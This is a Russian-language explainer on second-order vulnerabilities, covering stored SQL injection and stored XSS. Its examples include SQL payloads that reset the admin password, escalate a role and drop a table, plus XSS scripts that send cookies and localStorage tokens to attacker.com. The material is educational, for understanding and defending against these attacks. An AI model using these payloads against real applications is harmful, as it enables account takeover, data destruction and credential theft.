# **Что такое уязвимости второго порядка?**

**Уязвимости второго порядка (Second-Order Vulnerabilities)** — это атаки, при которых вредоносные данные сначала сохраняются в системе, а затем активируются позже, когда эти данные используются или обрабатываются другим компонентом системы.

### **Ключевое отличие от атак первого порядка:**

|Параметр|Первый порядок|Второй порядок|
|---|---|---|
|**Время выполнения**|Немедленно|Отложенно|
|**Точка инъекции** ≠ **Точка выполнения**|Одна и та же|Разные|
|**Сложность обнаружения**|Относительно проще|Сложнее|

---

## **SQL Injection второго порядка**

### **Механизм:**

1. **Фаза внедрения:** Атакующий вводит вредоносный SQL-код, который сохраняется в БД
    
2. **Фаза выполнения:** Позже приложение извлекает эти данные и использует в SQL-запросе без санитизации
    

### **Пример сценария:**

**1. Регистрация пользователя:**
``` sql
-- Атакующий регистрируется с именем:
"admin' -- "

-- Это сохраняется в БД:
INSERT INTO users (username, password) VALUES ('admin'' -- ', 'hacker_password');
```
**2. Функция смены пароля администратором:**
```sql
-- Администратор пытается сбросить пароль пользователя:
UPDATE users SET password = 'new_password' WHERE username = 'input_username';

-- Подставляется значение из БД:
UPDATE users SET password = 'new_password' WHERE username = 'admin' -- ';
```
**Результат:** Пароль сбрасывается для пользователя `admin`, а не для атакующего!

### **Другие сценарии SQLi второго порядка:**

**Внедрение через email:**
```sql
-- При регистрации:
Email: "test@test.com'; UPDATE users SET role='admin' WHERE email='test@test.com'--"

-- При отправке письма с подтверждением:
SELECT email FROM users WHERE id=123; 
-- Позже используется в запросе рассылки...
```
**Внедрение через комментарии:**
```sql
-- Комментарий к товару:
"Great product!'; DROP TABLE orders--"

-- При формировании отчета администратором...
```

---

## **XSS второго порядка (Stored/Persistent XSS)**

### **Механизм:**

1. **Фаза внедрения:** Атакующий сохраняет вредоносный JavaScript в системе
2. **Фаза выполнения:** Жертва загружает страницу, содержащую этот скрипт

### **Примеры:**

**1. XSS в профиле пользователя:**
```html
<!-- Атакующий вставляет в поле "О себе": -->
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Или более скрытно: -->
<img src="x" onerror="stealData()">
```
**2. XSS в комментариях:**
```html
// Сохраняется в комментарии к статье
<script>
var i = new Image();
i.src = "http://attacker.com/log?data=" + encodeURIComponent(localStorage.getItem('tokens'));
</script>
```
**3. XSS через загружаемые файлы:**
```txt
<!-- Атакующий загружает HTML-файл как "документ" -->
<!-- При просмотре файла выполняется скрипт -->
```

---

## **Почему уязвимости второго порядка опасны?**

### **1. Сложность обнаружения:**

- Статические сканеры могут не найти уязвимость
- Ручное тестирование требует понимания полного flow данных
- Code review сложно отследить все пути данных

### **2. Высокий impact:**

- **Эскалация привилегий:** пользователь → администратор
- **Кража данных** всех пользователей
- **Цепные атаки:** комбинация нескольких уязвимостей

### **3. Долгосрочное воздействие:**

- Данные могут "лежать" в системе месяцами
- Активация при определенных условиях
- Сложно очистить все зараженные данные

---